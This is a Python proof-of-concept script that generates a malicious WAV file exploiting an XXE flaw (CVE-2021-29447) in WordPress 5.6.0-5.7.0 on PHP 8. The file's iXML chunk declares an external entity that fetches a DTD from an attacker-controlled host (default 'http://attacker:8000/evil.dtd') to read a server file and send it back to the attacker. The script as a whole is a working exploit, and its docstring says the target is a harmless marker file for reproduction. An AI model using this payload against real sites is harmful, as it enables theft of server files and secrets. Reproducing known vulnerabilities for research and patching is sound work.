#!/usr/bin/env python3
"""Generate a malicious WAV (iXML XXE) for CVE-2021-29447 reproduction.

The WAV carries an iXML chunk whose content is an XML document that declares an
external parameter entity pointing at an attacker-controlled DTD.  WordPress
(5.6.0-5.7.0 on PHP 8) parses it via getID3 -> simplexml_load_string(), fetching
the DTD (out-of-band).  The DTD reads a target file (here our harmless
/tmp/rq-c1-poc-marker) and exfiltrates it back to the attacker HTTP listener.

Usage: gen-wav.py <attacker_url_base> <out.wav>
"""
import struct, sys

attacker = sys.argv[1] if len(sys.argv) > 1 else "http://attacker:8000"
out = sys.argv[2] if len(sys.argv) > 2 else "payload.wav"

xml = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY % remote SYSTEM "' + attacker + '/evil.dtd">%remote;]>'
).encode()

data = xml + b"\x00"
# iXML chunk = "iXML" + size + data(padded to even)
ichunk = b"iXML" + struct.pack("<I", len(data)) + data
if len(data) % 2:
    ichunk += b"\x00"
riff_body = b"WAVE" + ichunk
wav = b"RIFF" + struct.pack("<I", len(riff_body)) + riff_body

with open(out, "wb") as f:
    f.write(wav)
print("wrote %s (%d bytes); iXML xml=%r" % (out, len(wav), xml.decode()))
